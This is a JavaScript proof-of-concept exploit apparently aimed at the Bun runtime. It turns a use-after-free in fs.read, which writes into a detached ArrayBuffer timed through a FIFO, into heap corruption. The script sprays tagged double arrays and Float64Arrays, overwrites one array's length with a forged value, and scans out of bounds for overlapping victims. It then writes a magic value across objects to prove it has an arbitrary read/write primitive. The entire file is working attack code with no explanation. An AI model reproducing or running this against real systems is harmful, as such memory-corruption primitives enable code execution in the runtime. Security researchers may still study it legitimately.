import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 48);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const writeOffset = Number(process.env.WRITE_OFFSET || 136);
const newLength = Number(process.env.NEW_LENGTH || 2048);
const oobScan = Number(process.env.OOB_SCAN || Math.max(0, newLength - slots - 4));
const sampleRun = Number(process.env.SAMPLE_RUN || 4);
const typedEvery = Number(process.env.TYPED_EVERY || 2);
const magic = Number(process.env.MAGIC_DOUBLE || 1.23456789012345e+123);
const stopOnSuccess = process.env.STOP_ON_SUCCESS !== "0";
const path = join(tmpdir(), `bun-double-oob-float64array-bridge-${process.pid}`);
const retained = [];

const doubleBase = 8192.5;
const typedBase = 1048576.5;
const stride = 64;
const scale = 4096;

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function patternValue(type, arrayIndex, elementIndex) {
  const base = type === "typed" ? typedBase : doubleBase;
  return base + arrayIndex * stride + elementIndex / scale;
}

function closeEnough(a, b) {
  return Math.abs(a - b) < 0.00000001;
}

function decodePattern(value) {
  if (typeof value !== "number" || !Number.isFinite(value)) return null;

  for (const type of ["double", "typed"]) {
    const base = type === "typed" ? typedBase : doubleBase;
    const delta = value - base;
    if (delta < 0) continue;

    const arrayIndex = Math.floor(delta / stride);
    if (arrayIndex < 0 || arrayIndex >= retained.length) continue;

    const local = delta - arrayIndex * stride;
    const elementIndex = Math.round(local * scale);
    if (elementIndex < 0 || elementIndex >= slots) continue;
    if (retained[arrayIndex]?.type !== type) continue;
    if (!closeEnough(value, patternValue(type, arrayIndex, elementIndex))) continue;
    return { type, arrayIndex, elementIndex };
  }

  return null;
}

function makeDoubleArray(arrayIndex) {
  const arr = new Array(slots);
  for (let j = 0; j < slots; j++) arr[j] = patternValue("double", arrayIndex, j);
  return arr;
}

function makeFloat64Array(arrayIndex) {
  const arr = new Float64Array(new ArrayBuffer(size));
  for (let j = 0; j < slots; j++) arr[j] = patternValue("typed", arrayIndex, j);
  return arr;
}

function allocateMixedVictims() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    if (typedEvery > 0 && i % typedEvery === typedEvery - 1) {
      out.push({ type: "typed", arrayIndex: i, arr: makeFloat64Array(i) });
    } else {
      out.push({ type: "double", arrayIndex: i, arr: makeDoubleArray(i) });
    }
  }
  return out;
}

function makeLengthPayload() {
  const payload = Buffer.alloc(8);
  payload.writeUInt32LE(newLength >>> 0, 0);
  payload.writeUInt32LE(newLength >>> 0, 4);
  return payload;
}

function findCorruptedDouble() {
  for (const entry of retained) {
    if (entry.type !== "double") continue;
    if (entry.arr.length !== slots) return entry;
  }
  return null;
}

function findOverlaps(source) {
  const overlaps = [];
  const maxRelative = Math.min(oobScan, Math.max(0, source.arr.length - slots - sampleRun));

  for (let relativeIndex = 0; relativeIndex <= maxRelative; relativeIndex++) {
    const decoded = decodePattern(source.arr[slots + relativeIndex]);
    if (!decoded || decoded.arrayIndex === source.arrayIndex) continue;
    if (decoded.elementIndex + sampleRun >= slots) continue;

    let matches = true;
    for (let k = 1; k < sampleRun; k++) {
      const actual = source.arr[slots + relativeIndex + k];
      const expected = patternValue(decoded.type, decoded.arrayIndex, decoded.elementIndex + k);
      if (typeof actual !== "number" || !closeEnough(actual, expected)) {
        matches = false;
        break;
      }
    }

    if (matches) {
      overlaps.push({ relativeIndex, ...decoded });
      if (overlaps.length >= 16) break;
    }
  }

  return overlaps;
}

function attemptTypedWrite(source, overlap) {
  if (overlap.type !== "typed") return null;
  const victim = retained[overlap.arrayIndex].arr;
  const targetElement = overlap.elementIndex + 1;
  if (targetElement >= victim.length) return null;

  const before = victim[targetElement];
  source.arr[slots + overlap.relativeIndex + 1] = magic;
  const after = victim[targetElement];
  return {
    overlap,
    targetElement,
    before,
    after,
    changedToMagic: Object.is(after, magic),
  };
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);
  view.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, view, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateMixedVictims());
  gcNow();

  fs.writeSync(fd, makeLengthPayload(), 0, 8);
  const result = await done;
  const source = findCorruptedDouble();
  const overlaps = source ? findOverlaps(source) : [];
  const typedAttempts = [];

  for (const overlap of overlaps) {
    const attempt = attemptTypedWrite(source, overlap);
    if (!attempt) continue;
    typedAttempts.push(attempt);
    if (attempt.changedToMagic) break;
  }

  const summary = {
    iteration,
    size,
    sprayCount,
    slots,
    typedEvery,
    writeOffset,
    newLength,
    oobScan,
    magic,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    source: source && {
      arrayIndex: source.arrayIndex,
      length: source.arr.length,
      first: source.arr[0],
      lastInBounds: source.arr[slots - 1],
    },
    overlaps,
    typedAttempts,
  };

  console.log(JSON.stringify(summary));
  return typedAttempts.some(attempt => attempt.changedToMagic);
}

try {
  let successes = 0;
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      successes++;
      if (stopOnSuccess) break;
    }
  }
  console.log(JSON.stringify({ final: true, iterations, successes, stopOnSuccess }));
  process.exitCode = successes > 0 ? 86 : 1;
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
